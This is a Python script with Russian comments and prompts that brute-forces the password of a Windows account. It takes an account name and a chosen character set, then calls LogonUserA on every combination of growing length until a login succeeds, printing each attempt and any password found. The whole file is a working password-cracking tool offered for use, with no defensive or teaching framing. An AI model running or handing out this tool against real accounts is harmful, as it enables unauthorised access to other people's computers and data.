import ctypes
import win32security
import win32api
import itertools
import string
import time

time_start = int(time.time())
# Определяем необходимые константы
LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

# Указываем имя пользователя и пароль
account = str(input("Введите имя учетной записи: "))
username = account  # Замените на ваше имя пользователя

characters = string.digits



# Добавляем русские буквы
russian_letters = 'абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'

digits = str(input("Вы хотите использовать числа для подбора: ( Y/n ) "))
if digits == "Y" or digits == "y" or digits == "Д" or digits == "д":
    characters = string.digits

    ascii_letters = str(input("Вы хотите использовать латинские буквы для подбора: ( Y/n ) "))

    if ascii_letters == "Y" or ascii_letters == "y" or ascii_letters == "Д" or ascii_letters == "д":
        characters = string.digits + string.ascii_letters

        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))

        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
            characters = string.digits + string.ascii_letters + russian_letters

            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))

            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.digits + string.ascii_letters + russian_letters +string.punctuation

        else:
            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))

            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.digits + string.ascii_letters + string.punctuation
    else:
        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))

        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
            characters = string.digits + russian_letters

            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.digits + russian_letters + string.punctuation
        
        else:
            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.digits + string.punctuation

else:
    ascii_letters = str(input("Вы хотите использовать буквы для подбора: ( Y/n ) "))
    if ascii_letters == "Y" or ascii_letters == "y" or ascii_letters == "Д" or ascii_letters == "д":
        characters = string.ascii_letters

        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))

        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
            characters = string.ascii_letters + russian_letters

            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))
            
            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.ascii_letters + russian_letters + string.punctuation
    else:
        russian_letter = str(input("Вы хотите использовать кириллицу для подбора: ( Y/n ) "))

        if russian_letter == "Y" or russian_letter == "y" or russian_letter == "Д" or russian_letter == "д":
            characters = russian_letters

            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))

            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = russian_letters + string.punctuation
        
        else:
            punctuation = str(input("Вы хотите использовать специальные символы для подбора: ( Y/n ) "))

            if punctuation == "Y" or punctuation == "y" or punctuation == "Д" or punctuation == "д":
                characters = string.punctuation



# Начинаем с длины пароля 1
i = 1
found = False

try:
    while not found:
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)

            # Попытка входа в систему
            token = ctypes.c_void_p()
            result = ctypes.windll.advapi32.LogonUserA(
                username.encode('utf-8'),
                None,  # Укажите домен, если необходимо
                password.encode('utf-8'),
                LOGON32_LOGON_INTERACTIVE,
                LOGON32_PROVIDER_DEFAULT,
                ctypes.byref(token)
            )

            if result:
                print("Вход выполнен успешно!", password)
                found = True
                break
            else:
                print("Ошибка входа:", win32api.GetLastError(), password)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1

except Exception as ex:
    print("Произошла ошибка:", ex)

time_finish = int(time.time() - time_start)
print(f"{time_finish} секунд(ы)")

result = str(input("Нажмите на ENTER для того чтобы консоль закрылась...."))
